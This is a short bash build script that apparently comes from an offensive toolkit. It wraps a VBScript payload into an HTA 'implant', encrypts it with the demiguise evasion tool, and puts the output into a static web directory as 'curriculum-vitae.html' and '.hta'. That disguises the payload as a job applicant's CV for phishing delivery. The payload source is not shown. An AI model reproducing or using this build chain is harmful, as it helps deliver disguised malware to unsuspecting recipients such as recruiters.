#!/bin/bash

sourceFileName="source.vbs"
templateFileName="hta-template.hta"

# split template file into two parts, xx00 and xx01
csplit $templateFileName '/^replaceme$/' 1> /dev/null

part1=$(cat xx00)
part2=$(tail -n +2 xx01)

# delete temp files
rm xx00
rm xx01

# obfuscate source
#./obfuscate.py $sourceFileName obfuscated.vbs 1> /dev/null
cp $sourceFileName obfuscated.vbs

echo "$part1" > build/implant.hta

cat obfuscated.vbs >> build/implant.hta
rm obfuscated.vbs

echo "$part2" >> build/implant.hta

./demiguise/demiguise.py -k 'jQuery2.js' -e build/implant.hta -o app.hta > /dev/null
mv app.html build/implant.html
cp build/implant.html ../../static/curriculum-vitae.html
cp build/implant.hta ../../static/curriculum-vitae.hta
